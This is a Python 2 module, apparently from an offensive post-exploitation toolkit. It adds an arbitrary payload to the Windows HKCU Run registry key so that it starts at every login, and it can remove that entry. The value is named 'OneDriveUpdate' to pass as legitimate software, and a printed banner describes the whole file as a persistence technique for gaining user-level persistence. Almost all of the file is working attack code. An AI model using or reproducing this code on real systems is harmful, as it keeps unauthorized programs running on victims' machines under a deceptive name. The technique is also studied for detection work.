import os
import _winreg
from core.prints import *

def hkcu_run_delete():
	"""
	Delete persistence by calling this function
	"""
	try:
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"),0,_winreg.KEY_ALL_ACCESS)					
		_winreg.DeleteValue(key,"OneDriveUpdate")
		_winreg.CloseKey(key)
	except Exception as error:
		print_error("Unable to delete persistence key")
		return False
	else:
		print_success("Successfully deleted persistence key")

def hkcu_run(payload):
	print """
 -------------------------------------------------------------
 Persistence technique using HKEY_CURRENT_USER Run registry
 key to add executable to startup. This is very easy to
 detect.
 
 When everything worked correctly, we should gain persistence
 with current user privledges.
 -------------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))

	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
		_winreg.SetValueEx(key,"OneDriveUpdate",0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		print_error("Unable to create persistence key")
		return False
	else:
		print_success("Successfully created persistence key")